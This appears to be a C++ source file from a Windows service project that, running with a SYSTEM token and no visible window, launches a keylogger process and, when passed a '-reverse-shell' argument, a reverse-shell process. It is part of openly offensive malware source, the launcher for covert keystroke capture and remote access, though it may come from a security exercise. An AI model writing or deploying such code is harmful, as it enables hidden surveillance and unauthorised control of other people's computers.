#include "tinky.hpp"
#include "utils.hpp"
#include "processes.h"

#include <vector>

extern tinky_t		tinky;
extern processes_t	processes;

static BYTE launchDefaultProcessWinkey(void) {
	wstring processPath = getServicePath(KYLG_NAME);
	journalReport(L"Found process path: " + processPath);

	if (!CreateProcessAsUserW(
		processes.systemToken,
		processPath.c_str(),
		NULL, NULL, NULL,
		FALSE,
		CREATE_NO_WINDOW,
		NULL, NULL,
		&processes.winkeyStartupInfo,
		&processes.winkeyProcessInfo
	)) {
		journalReport(L"Process failed to launch with code: \n" + itostring(GetLastError()));
		return (FAILURE);
	}
	journalReport(L"Process launched\n");
	return (SUCCESS);
}

static BYTE launchGenericProcess(const wchar_t *genericProcessName) {
	static BYTE alreadyDone = FALSE;
	wstring processPath = getServicePath(genericProcessName);
	journalReport(L"Found process path: " + processPath);
	
	if (alreadyDone == TRUE) return (SUCCESS);
	
	alreadyDone = TRUE;
	
	process_t	newProcess = { genericProcessName }; // Expend to all generic process ?

	if (!CreateProcessAsUserW(
		processes.systemToken,
		processPath.c_str(),
		NULL, NULL, NULL,
		FALSE,
		CREATE_NO_WINDOW,
		NULL, NULL,
		&newProcess.processStartupInfo,
		&newProcess.processProcessInfo
	)) {
		journalReport(L"Generic process failed to launch with code: \n" + itostring(GetLastError()));
		return (FAILURE);
	}

	journalReport(L"Generic process launched\n");
	processes.processesVector.push_back(newProcess);

	return (SUCCESS);
}

BYTE launchProcesses(DWORD dwNumServicesArgs, LPWSTR *lpServiceArgVectors) {
	if (!launchDefaultProcessWinkey())
		return (FAILURE);

	for (DWORD i = 0; i < dwNumServicesArgs; i++) { // Verification de success ?
		if (!wcscmp(lpServiceArgVectors[i], L"-reverse-shell"))
			launchGenericProcess(RSHELL_NAME);
	}
	return (SUCCESS);
}